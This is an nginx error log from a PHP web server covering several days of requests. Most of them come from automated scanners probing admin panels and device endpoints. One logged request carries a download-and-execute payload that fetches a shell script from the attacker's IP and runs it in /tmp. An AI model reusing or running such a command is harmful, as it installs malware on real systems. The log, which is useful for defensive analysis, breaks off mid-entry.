2019/07/17 12:19:43 [error] 1222#0: *3440 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined variable: def_nav in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined variable: def_nav in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 148.70.85.104, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/17 15:06:43 [error] 1222#0: *3459 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined variable: def_nav in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined variable: def_nav in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 60.191.66.222, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/18 02:39:04 [error] 1222#0: *3627 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 218.61.16.142, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/18 08:33:06 [error] 1222#0: *3675 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 89.248.174.198, server: 132.232.179.176, request: "GET /shell?cd+/tmp;wget+http:/\/89.248.174.198/jaws.sh+-O+-+>smoke.sh;chmod+777+smoke.sh;sh+smoke.sh HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176"
2019/07/18 09:26:58 [error] 1222#0: *3681 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 82.209.201.182, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/18 10:47:03 [error] 1222#0: *3689 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 218.61.16.142, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/18 11:59:02 [error] 1222#0: *3705 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 54.169.211.252, server: 132.232.179.176, request: "GET /admin-scripts.asp HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176"
2019/07/18 11:59:02 [error] 1222#0: *3707 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 54.169.211.252, server: 132.232.179.176, request: "GET /admin-scripts.asp HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176"
2019/07/18 14:05:15 [error] 1222#0: *3714 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 218.61.16.142, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/18 20:57:05 [error] 1222#0: *3772 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 148.251.13.111, server: 132.232.179.176, request: "POST /users?page=&size=5 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/18 23:01:42 [error] 1222#0: *3786 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 218.61.16.142, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/18 23:32:30 [error] 1222#0: *3788 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 60.191.66.222, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/19 03:14:22 [error] 1222#0: *3808 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 120.132.3.65, server: 132.232.179.176, request: "GET http://www.qq.com/404/search_children.js HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "www.qq.com"
2019/07/19 14:51:08 [error] 1222#0: *3912 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 119.188.248.233, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/20 02:05:48 [error] 1222#0: *3985 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 103.233.10.167, server: 132.232.179.176, request: "POST /sdk HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/20 02:05:48 [error] 1222#0: *3987 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 103.233.10.167, server: 132.232.179.176, request: "GET /nmaplowercheck1563559545 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/20 02:05:48 [error] 1222#0: *3992 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 103.233.10.167, server: 132.232.179.176, request: "GET /HNAP1 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/20 02:26:40 [error] 1222#0: *4009 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 181.46.32.25, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/20 08:58:37 [error] 1222#0: *4048 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 218.61.16.142, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/21 01:13:24 [error] 1222#0: *4143 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 211.38.144.230, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/21 04:57:02 [error] 1222#0: *4218 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 13.229.44.223, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/21 09:13:05 [error] 1222#0: *4250 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 113.140.249.105, server: 132.232.179.176, request: "GET /common.js HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/21 12:46:15 [error] 1222#0: *4274 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 119.188.248.233, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/21 15:52:56 [error] 1222#0: *4318 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 118.25.73.12, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/22 00:26:03 [error] 1222#0: *4382 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 89.121.201.154, server: 132.232.179.176, request: "GET /%73%65%65%79%6F%6E/%68%74%6D%6C%6F%66%66%69%63%65%73%65%72%76%6C%65%74 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/22 00:26:03 [error] 1222#0: *4384 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 89.121.201.154, server: 132.232.179.176, request: "GET /manager/html HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/22 00:51:40 [error] 1222#0: *4422 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 81" while reading response header from upstream, client: 134.175.27.47, server: 132.232.179.176, request: "POST /users?page=&size=5 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "132.232.179.176:8080"
2019/07/22 01:56:18 [error] 1222#0: *4435 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: module in /www/chart/leedong/pro/views/layouts/main.php on line 80
